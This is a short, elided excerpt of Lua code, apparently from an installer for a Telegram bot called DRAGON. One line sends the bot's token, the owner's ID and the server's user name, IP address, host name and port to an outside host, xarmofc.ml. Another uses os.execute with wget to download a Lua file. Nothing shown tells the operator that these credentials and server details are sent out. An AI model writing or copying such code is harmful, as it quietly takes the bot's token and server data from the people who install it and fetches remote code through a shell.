...
data,res = https.request("https://xarmofc.ml/watan/index.php?bn=DRAGON&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://xarmofc.ml/watan/index.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
...
os.execute('wget https://raw.githubusercontent.com/WaTaNtEaM/WaTaN/main/DRAGON.lua')
